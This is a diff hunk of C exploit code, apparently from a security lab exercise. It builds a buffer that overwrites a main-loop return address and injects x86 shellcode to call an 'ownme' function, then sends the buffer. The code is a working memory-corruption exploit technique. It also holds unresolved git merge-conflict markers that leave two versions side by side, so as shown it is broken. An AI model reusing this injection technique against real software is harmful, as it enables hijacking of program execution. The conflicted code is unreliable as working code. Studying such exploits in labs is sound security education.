@@ -210,12 +210,7 @@ int main(int argc, char* argv[]) {
    exploit[162/sizeof(void*)] = (void*) cur_mainloop_ra_loc + 2;
    exploit[174/sizeof(void*)] = (void*) cur_mainloop_ra_loc + 3;
 
-   // put_bin((void*)exploit, explsz);
-   // send();
-
-   // TODO: INJECT CODE TO CALL OWNME AT OFFSET 256 IN EXPLOIT BUFFER
-   // MAIN_LOOP'S RA IS ALREADY BEING SET TO POINT TO THIS LOCATION
-
+   // Inject code
    char injected_code[] =
       "\xB8\x00\x00\x00\x00"  /* mov $<ownme_addr>, %eax */
       "\xFF\xD0"              /* call *%eax */
@@ -223,10 +218,17 @@ int main(int argc, char* argv[]) {
       "\x68\x00\x00\x00\x00"  /* push $<cur_main_ra> */
       "\xC3"                  /* ret */
    ;
-
+   
    memcpy((char*)injected_code + 1, &cur_ownme_addr, sizeof(unsigned));
+<<<<<<< HEAD
    memcpy((char*)exploit + 256, &injected_code, sizeof(injected_code));
 
+=======
+   memcpy((char*)injected_code + 10, &cur_mainloop_ra, sizeof(unsigned));
+   memcpy((char*)exploit + 256, injected_code, sizeof(injected_code));
+
+   // Write payload
+>>>>>>> 746def60e3a0e8126784389299d302190905e3f1
    put_bin((void*)exploit, explsz);
    send();
 
